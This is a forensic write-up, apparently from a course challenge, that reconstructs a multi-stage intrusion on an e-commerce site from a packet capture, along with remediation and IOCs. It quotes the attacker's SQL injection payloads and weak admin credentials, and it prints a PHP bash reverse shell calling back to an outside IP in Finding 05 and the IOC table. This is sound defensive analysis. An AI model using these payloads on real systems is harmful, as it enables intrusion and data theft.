# Operation Silent Intrusion

## Multi-Stage Web Application Intrusion: bookworldstore.com Forensic Investigation

## 1. Engagement Overview

A forensic investigation was conducted on a provided packet capture file
(`WebInvestigation.pcap`) capturing a confirmed multi-stage intrusion against
`bookworldstore.com`, an e-commerce book platform operated by NetSysLink's
client. The SOC detected anomalous outbound traffic and database anomalies at
02:42 AM on 15 March 2024. Analysis confirmed a targeted attack originating
from IP `111.224.250.131` (Shijiazhuang, Hebei, China) that progressed from
SQL injection through database enumeration, directory discovery, admin
authentication, and persistent web shell installation. Wireshark was used for
packet-level analysis and TCP stream reconstruction. IP geolocation was
confirmed via ASN lookup against the attacker's address.

---

## 2. Objectives

- Identify the attacker's IP address and geographic origin from packet
  conversation statistics and payload inspection
- Determine which endpoint was exploited first and reconstruct the SQL
  injection methodology used
- Identify which database table held compromised customer records and what
  columns were exposed
- Trace the attacker's path from SQLi through directory enumeration to admin
  authentication
- Document the credentials used to gain admin access and the web shell
  uploaded for persistence
- Provide specific remediation recommendations for each confirmed attack vector
- Assess how existing SOC tooling and processes can be improved to detect and
  contain this attack class earlier in the kill chain

---

## 3. Scope

**In-Scope:**
- Provided PCAP file (`WebInvestigation.pcap`) capturing traffic between
  attacker IP `111.224.250.131` and server IP `73.124.22.98`
- Web application endpoints: `/search.php`, `/admin/login.php`,
  `/admin/index.php`
- Uploaded web shell: `NVri2vhp.php`
- Reverse shell outbound connection to `111.224.250.131` on TCP port 443

**Out-of-Scope:**
- Internal network traffic beyond the web application server
- Database server direct traffic
- Any live system access

**Authorization Statement:**
> This investigation was conducted on a pre-captured PCAP file provided as part
> of a course challenge exercise. No live systems were accessed or exploited at
> any point. All analysis was performed in a controlled lab environment for
> educational purposes under authorized course instruction.

---

## 4. Methodology

### Phase 1: Attacker Identification
Wireshark conversation statistics were opened (Statistics > Conversations >
TCP tab). The IP pair `111.224.250.131` and `73.124.22.98` accounted for
94.22% of total packets (83,368 packets, 28 MB). This volume alone was not
sufficient to confirm the attacker. Twenty packets from the suspect IP were
inspected individually. The packet info column showed URL-encoded SQL injection
patterns in repeated GET requests to `/search.php`, confirming `111.224.250.131`
as the attacker. ASN and geolocation lookup against the IP confirmed the origin
as ChinaNet Hebei Province (ASN 4134), Shijiazhuang, Hebei, China.

### Phase 2: SQL Injection Analysis
HTTP stream filtering was applied using `http.request.method == "GET"` and
`ip.src == 111.224.250.131`. TCP streams were followed for requests to
`/search.php` to reconstruct the full injection sequence. The first injection
payload, a boolean-based probe (`book%20and%201=1;%20--%20-`), was identified
in TCP stream 36. Subsequent streams showed UNION SELECT payloads using
`sqlmap/1.8.3` as the User-Agent, confirming automated tool usage. The
server's 200 OK responses containing database table names and column schemas
in the HTML response body were extracted from stream content.

### Phase 3: Directory Enumeration and Admin Access
HTTP GET requests to `/admin/` were identified returning HTTP 302. A subsequent
POST request to `/admin/login.php` was followed in the TCP stream, which
showed form-encoded credentials submitted in the request body. The 302 redirect
response to `/admin/index.php` confirmed successful authentication. The
`/admin/index.php` response body was extracted and showed a file upload form.

### Phase 4: Web Shell Upload and Persistence
A POST request to `/admin/index.php` with `Content-Type: multipart/form-data`
was identified. The TCP stream was followed to extract the full upload request,
including the PHP payload content embedded in the file part. The server's
response confirming "The file NVri2vhp.php has been uploaded" was identified
and the HTTP 200 OK response recorded.

---

## 5. Vulnerability Summary

| ID | Vulnerability | Severity | Affected Endpoint |
|----|--------------|----------|-------------------|
| 01 | SQL Injection : UNION-Based Database Enumeration | Critical | /search.php |
| 02 | Customer PII Exposed via SQLi (customers table) | Critical | /search.php |
| 03 | Hidden Admin Directory Accessible via Directory Enumeration | High | /admin/ |
| 04 | Default / Weak Admin Credentials | High | /admin/login.php |
| 05 | Unrestricted File Upload: PHP Web Shell Installed | Critical | /admin/index.php |
| 06 | Server Version Disclosure via HTTP Response Headers | Medium | All HTTP Responses |

---

## 6. Detailed Findings

---

### Finding 01 : SQL Injection via UNION SELECT on /search.php

#### Severity
Critical

#### Affected Endpoint
`/search.php`: GET, `search` parameter

#### Description
The `/search.php` endpoint passes the `search` GET parameter directly into a
SQL query without parameterization. The attacker confirmed the vulnerability
with a boolean-based probe, then used `sqlmap` v1.8.3 to automate UNION SELECT
injection. The automated tool enumerated the database schema by querying
`INFORMATION_SCHEMA.TABLES` and `INFORMATION_SCHEMA.COLUMNS`, returning table
and column names in the application's HTML response body. The server returned
HTTP 200 for all successful injection requests.

#### Proof of Concept

First boolean-based probe extracted from TCP stream 36:



![Wireshark TCP Stream 36 - First SQLi Probe Request to /search.php](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%20II/Screenshots/48_01%20Wireshark%20TCP%20Stream%2036%20-%20First%20SQLi%20Probe%20Request%20to%20search.php.jpg)



First injection URI:
```

/search.php?search=book%20and%201=1;%20--%20-
```

UNION SELECT payload used for schema enumeration (decoded from URL encoding):
```
GET /search.php?search=book' UNION ALL SELECT NULL,
CONCAT(0x7178766271, JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,
table_name)), 0x7176706a71)
FROM INFORMATION_SCHEMA.TABLES
WHERE table_schema IN (0x626f6f6b776f726c64...)-- - HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.8.3#stable (https://sqlmap.org)
Host: bookworldstore.com
```

Server response returning database table names in the HTML body:



![Wireshark - 200 OK Response Containing admin, books, customers Table Names](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%20II/Screenshots/48_02%20Wireshark%20-%20200%20OK%20Response%20Containing%20admin%2C%20books%2C%20customers%20Table%20Names.jpg)



Database response embedded in HTML:
```html
<p>qxvbq["admin", "books", "customers"]qvpjq</p>
```

#### Impact
The SQL injection gave the attacker a complete picture of the database
structure. Confirming the existence of a `customers` table and an `admin`
table in the same database provided the attacker with two immediate targets:
customer PII and administrative credentials. The UNION SELECT technique
returned data in the visible response body, making extraction trivial with
no blind injection techniques required.

#### Remediation
- Replace all raw query construction with prepared parameterized statements.
The application must not pass `$_GET['search']` directly into a SQL string.
- Deploy a Web Application Firewall configured to detect and block requests
containing SQL keywords (`UNION`, `SELECT`, `INFORMATION_SCHEMA`) in GET
parameters. The WAF provides a detection and blocking layer while the code
fix is implemented.

---

### Finding 02: Customer PII Exposed via SQL Injection

#### Severity
Critical

#### Affected Endpoint
`/search.php`: GET, `search` parameter (customers table)

#### Description
Following schema enumeration, the attacker used `sqlmap` to target the
`customers` table specifically. A UNION SELECT payload queried
`INFORMATION_SCHEMA.COLUMNS` with a `WHERE table_name = 'customers'` filter,
returning the full column list. The server response confirmed the customers
table contained the columns: `address`, `email`, `first_name`, `id`,
`last_name`, and `phone`. With the column structure known, the attacker had
everything needed to dump the entire customer database.

#### Proof of Concept

Wireshark TCP stream showing sqlmap UNION SELECT querying the customers table
column structure:



![Wireshark - sqlmap UNION SELECT Querying INFORMATION_SCHEMA.COLUMNS for customers Table](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%20II/Screenshots/48_02%20Wireshark%20-%20200%20OK%20Response%20Containing%20admin%2C%20books%2C%20customers%20Table%20Names.jpg)



Server response confirming column names in the customers table:
```html
<p>qxvbq["address|zgjckvarchar(255)", "email|zgjckvarchar(100)",
"first_name|zgjckvarchar(50)", "id|zgjckint",
"last_name|zgjckvarchar(50)", "phone|zgjckvarchar(20)"]qvpjq</p>
```

#### Impact
The `customers` table on an e-commerce book store holds the personal
information of all registered buyers. The confirmed columns (full name, email,
address, phone) constitute personally identifiable information. In a real
incident, complete extraction of this table would result in a reportable
data breach with regulatory consequences under applicable data protection law.
The `email` column alone is sufficient for targeted phishing campaigns against
every customer in the database.

#### Remediation
In addition to the parameterized query fix from Finding 01, implement
column-level access controls ensuring the application database user account
has `SELECT` rights only on the specific columns required for each function.
The search feature does not require access to the `customers` table at all.
The application database account should be split by function, with the search
query using an account that has read-only access to the `books` table only.

---

### Finding 03: Hidden Admin Directory Accessible via Enumeration

#### Severity
High

#### Affected Endpoint
`/admin/`: HTTP GET

#### Description
After completing database enumeration, the attacker performed directory
enumeration against `bookworldstore.com`. HTTP GET requests to `/admin/`
returned an HTTP 302 redirect to `/admin/login.php`, confirming the directory
existed and was web-accessible. The redirect response itself disclosed the
existence of an administrative login page at a predictable, publicly
accessible path. No authentication challenge was encountered before the
redirect confirmed the admin area's existence.

#### Proof of Concept

HTTP GET request to `/admin/login.php` and the server's 302 redirect response
visible in the Wireshark TCP stream:



![Wireshark - GET /admin/ Request and 302 Redirect Response Confirming Admin Directory](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%20II/Screenshots/48_03%20Wireshark%20-%20GET%20admin%20Request%20and%20302%20Redirect%20Response%20Confirming%20Admin%20Directory.jpg)

Request and response:
```
POST /admin/login.php HTTP/1.1
Host: bookworldstore.com
...
HTTP/1.1 302 Found
Date: Fri, 15 Mar 2024 12:17:34 GMT
Server: Apache/2.4.52 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
```

#### Impact
An attacker who does not know the admin path cannot target the login page.
Exposing the admin directory at `/admin/`, a predictable and commonly
checked path means any automated directory scanner would find it. Once
found, the login page becomes the target for credential attacks, as
demonstrated in Finding 04.

#### Remediation
- Move the admin interface to a non-predictable path that is not guessable
by a standard wordlist. 
- Additionally, restrict access to the admin path
by IP address at the web server configuration level, allowing only traffic
from known administrative source IPs.
- Disable directory listing with `Options -Indexes` to prevent the web server
from confirming directory existence through redirect behavior.

---

### Finding 04: Weak Administrative Credentials

#### Severity
High

#### Affected Endpoint
`/admin/login.php`: POST, `username` and `password` fields

#### Description
The attacker authenticated to the administrative login page using the
credentials `admin` / `admin123!`. These credentials were submitted via HTTP
POST and the server returned HTTP 302, redirecting to `/admin/index.php`.
The successful authentication confirmed the admin account used a guessable,
commonly tested password. No account lockout, CAPTCHA, or multi-factor
authentication challenge was present. The credentials may have been obtained
through the SQL injection against the `admin` database table identified
during the enumeration phase.

#### Proof of Concept

TCP stream showing the POST request with credentials and the 302 redirect
confirming successful authentication:



![Wireshark - POST /admin/login.php with admin/admin123! Credentials and 302 Response](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%20II/Screenshots/48_04%20Wireshark%20-%20POST%20admin-login.php%20with%20admin%20admin123!%20Credentials%20and%20302%20Response.jpg)



Request body and response:
```
POST /admin/login.php HTTP/1.1
Host: bookworldstore.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Cookie: PHPSESSID=ae7mvmmf2krhir4kngnmio688a

username=admin&password=admin123%21

HTTP/1.1 302 Found
Date: Fri, 15 Mar 2024 12:17:34 GMT
```

#### Impact
Successful admin authentication gave the attacker access to the admin
dashboard at `/admin/index.php`, which contained a file upload form. Without
this authentication step, the file upload attack in Finding 05 would not
have been possible. The admin credential also suggests the `admin` table
enumerated in Finding 01 may contain stored passwords accessible via SQLi,
meaning the two findings may chain directly.

#### Remediation
- Change the admin password immediately to a randomly generated string of at least 20 characters. 
- Implement multi-factor authentication on all admin accounts before any other access is permitted. Apply rate limiting and account
lockout after 5 failed login attempts on the admin login endpoint.
- Consider removing the admin interface from the web-facing application entirely and managing the application through a separate, network-restricted management interface.

---

### Finding 05: Unrestricted File Upload via Admin Dashboard

#### Severity
Critical

#### Affected Endpoint
`/admin/index.php`: POST, file upload form

#### Description
The `/admin/index.php` page presented a file upload form immediately after
successful authentication. The attacker uploaded a PHP file named `NVri2vhp.php`
containing a reverse shell payload. The application performed no validation
on the uploaded file's type, extension, or content. The server stored the file
in a web-accessible location and confirmed the upload with the message "The
file NVri2vhp.php has been uploaded." The reverse shell was configured to
connect back to `111.224.250.131` on TCP port 443.

#### Proof of Concept

TCP stream showing the multipart POST upload request containing the PHP
reverse shell payload:



![Wireshark - POST /admin/index.php Multipart Upload Request with NVri2vhp.php Payload](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%20II/Screenshots/48_05%20Wireshark%20-%20POST%20admin-index.php%20Multipart%20Upload%20Request%20with%20NVri2vhp.php%20Payload.jpg)



Upload request content:
```
Content-Disposition: form-data; name="fileToUpload"; filename="NVri2vhp.php"
Content-Type: application/x-php

<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/111.224.250.131/443 0>&1'");?>
```

Server response confirming successful upload:
```
HTTP/1.1 200 OK
Date: Fri, 15 Mar 2024 12:24:17 GMT
Server: Apache/2.4.52 (Ubuntu)
...
The file NVri2vhp.php has been uploaded.
```

#### Impact
An uploaded PHP reverse shell could provides the attacker with persistent,
interactive remote access to the web server without needing to re-exploit
any prior vulnerability. The shell connects back to the attacker's machine,
bypassing inbound firewall rules. From this position, the attacker can read
all files accessible to the web server process, escalate privileges using
local exploits, access database credentials in application configuration
files, and pivot to internal network systems. The persistence survives
password changes, session termination, and even application patching unless
the file itself is removed.

#### Remediation
- Validate all uploaded files using server-side magic byte inspection before
storage. Reject any file whose content signature does not match a permitted
image type.
- Store uploaded files outside the web root and rename them to randomly
generated strings with a forced safe extension. Disable PHP execution in
all upload directories.

---

### Finding 06: Server Version Disclosure via HTTP Response Headers

#### Severity
Medium

#### Affected Endpoint

All HTTP responses (global)

#### Description
Every HTTP response from `bookworldstore.com` included the `Server` header
identifying the exact Apache version: `Apache/2.4.52 (Ubuntu)`. This was
visible across all captured responses. Apache 2.4.52 has publicly known CVEs
available in the NVD and Exploit-DB.

#### Proof of Concept

Server header observed across multiple response packets in Wireshark:
```
Server: Apache/2.4.52 (Ubuntu)
```

#### Impact
Knowing the exact server version allows an attacker to query CVE databases for
version-specific exploits before attempting any application-layer attacks. This
reduces reconnaissance effort and informs exploit selection.

#### Remediation
Set `ServerTokens Prod` and `ServerSignature Off` in the Apache configuration
to suppress version disclosure. Update Apache to the current supported release.

---

## 7. Attack Timeline

| Timestamp (UTC) | Phase | Action | Evidence |
|-----------------|-------|--------|----------|
| 02:42 AM, 15 Mar 2024 | Initial Alert | SOC detects outbound traffic spikes and database anomalies | SOC monitoring alerts |
| ~12:07 | Reconnaissance | `111.224.250.131` maps endpoints on bookworldstore.com | HTTP GET requests to common directories |
| ~12:08 | SQLi Probe | Boolean-based probe: `/search.php?search=book%20and%201=1;%20--%20-` | TCP stream 36 |
| ~12:08-12:09 | SQLi Enumeration | `sqlmap` UNION SELECT extracts table names: `admin`, `books`, `customers` | HTTP 200 responses with table data in body |
| ~12:09 | Data Extraction | Column structure of `customers` table enumerated: address, email, first_name, last_name, phone | HTTP 200 column list in response |
| ~12:09-12:17 | Discovery | Directory enumeration reveals `/admin/` returning HTTP 302 | GET /admin/ |
| ~12:17 | Credential Access | POST `/admin/login.php` with `admin/admin123!` returns HTTP 302 | TCP stream showing form POST |
| ~12:17 | Admin Access | Redirected to `/admin/index.php` with file upload form | HTTP GET /admin/index.php 200 OK |
| ~12:24 | Persistence | `NVri2vhp.php` reverse shell uploaded via admin file upload form | HTTP POST multipart, 200 OK, "file uploaded" |

---

## 8. Tools Used

- Kali Linux (investigation environment)
- Wireshark (packet capture analysis, TCP stream reconstruction, conversation statistics)
- ASN / GeoIP lookup (`whois`, `geoiplookup`) for attacker IP attribution
- `sqlmap` v1.8.3 (identified as attacker tooling via User-Agent header)

---

## 9. Indicators of Compromise (IOCs)

**Network-Based IOCs**

| Indicator | Value | Description |
|-----------|-------|-------------|
| Attacker IP | `111.224.250.131` | Source of all malicious traffic |
| Geographic Origin | Shijiazhuang, Hebei, China (ASN 4134: ChinaNet Hebei) | GeoIP attribution |
| User-Agent | `sqlmap/1.8.3#stable (https://sqlmap.org)` | Automated SQLi tool |
| User-Agent | `Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0` | Manual browsing sessions |
| C2 Port | TCP 443 | Reverse shell outbound destination |
| Exploited Endpoint | `/search.php` | SQLi injection point |
| Admin Login Endpoint | `/admin/login.php` | Credential submission point |
| Admin Upload Endpoint | `/admin/index.php` | Web shell upload point |

**Host-Based IOCs**

| Indicator | Value | Description |
|-----------|-------|-------------|
| Malicious Filename | `NVri2vhp.php` | PHP reverse shell |
| Shell Payload | `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/111.224.250.131/443 0>&1'");?>` | Reverse shell content |
| Compromised Credentials | `admin` / `admin123!` | Admin account used for authentication |
| Server Version | `Apache/2.4.52 (Ubuntu)` | Disclosed in response headers |
| Compromised Table | `customers` | Customer PII table targeted |
| Exposed Columns | `address, email, first_name, id, last_name, phone` | PII fields in customers table |

---

## 10. SOC Process Improvement Recommendations

**Detection Improvements**

- A WAF or IDS configured with regex rules targeting SQL keywords in GET
parameters would have flagged the injection at the first UNION SELECT request.
Patterns to detect include `UNION`, `SELECT`, `INFORMATION_SCHEMA`, and
`CONCAT` appearing in URL-encoded query parameters. The sqlmap User-Agent
(`sqlmap/1.8.3`) is a reliable blocklist entry that would have blocked all
automated injection requests immediately upon the first scan packet.

- File upload monitoring should alert on the creation of any `.php` file in web
directories. A File Integrity Monitoring tool (OSSEC, Tripwire, or Wazuh)
configured to watch the upload directory would have triggered an alert at the
moment `NVri2vhp.php` was written to disk, before the reverse shell was
activated.

**Response Automation**

- When the admin file upload alert fires, manual containment is too slow. A SOAR
playbook triggered by the alert should automatically isolate the affected host
from the network, revoke all active session tokens (invalidating the attacker's
PHPSESSID), preserve volatile memory and process list for forensic analysis,
and page the on-call engineer with the alert context already assembled. This
collapses the time between detection and containment from hours to seconds.

---

## 11. Challenges Encountered

- **Confirming the attacker IP required content inspection, not just volume:**
  `111.224.250.131` dominated the conversation statistics at 94.22% of packets,
  but volume alone could indicate a legitimate heavy user. Inspecting 20 packets
  and observing the SQL injection pattern in the URL-encoded GET parameters was
  the confirmation step that made the attribution defensible.
- **Distinguishing manual browsing from automated tool traffic:** The attacker
  used two different User-Agent strings. Firefox/115.0 appeared during manual
  reconnaissance and admin browsing. `sqlmap/1.8.3` appeared exclusively during
  the injection phase. Filtering by User-Agent helped isolate each attack phase
  in the timeline reconstruction.

---

## 12. Key Takeaways

- **Multi-stage attacks require layered defenses at each transition point:** The
  attacker needed four things to succeed: a SQLi endpoint, a discoverable admin
  directory, weak credentials, and an unrestricted upload form. Fixing any one
  of these would not have stopped the attack if the others remained. All four
  required independent remediation.
- **sqlmap leaves a distinctive signature:** The `sqlmap` User-Agent string is
  unambiguous. A single WAF rule blocking requests with that string in the
  User-Agent header would have stopped the automated enumeration phase entirely,
  forcing the attacker to fall back to manual injection which is far slower and
  more detectable.
- **Database schema exposure is a force multiplier:** Knowing that a table named
  `admin` exists in the same database as `customers` gave the attacker the target
  for credential extraction. If the schema had been obfuscated or the application
  database account lacked `INFORMATION_SCHEMA` access, the attacker would have
  needed to guess table names through blind injection, significantly increasing
  the time and noise of the attack.
- **Admin interface discovery is the pivot that made persistence possible:** SQLi
  alone damages the database. The file upload attack gave the attacker a
  persistent backdoor. The pivot between those two stages required finding the
  admin directory. Removing the admin path from public-facing infrastructure, or
  restricting it by source IP, would have broken the kill chain at the discovery
  phase regardless of what the SQLi returned.

---

## 13. Disclaimer

> This investigation was conducted on a pre-captured PCAP file (`WebInvestigation.pcap`)
> provided as part of a course challenge for the module Network Security Operations
> at ICDFA. No live systems were accessed, exploited, or disrupted at any point
> during this investigation. All findings are based solely on evidence present in
> the provided capture file. All techniques and indicators documented in this report
> are presented for educational and defensive awareness purposes only.
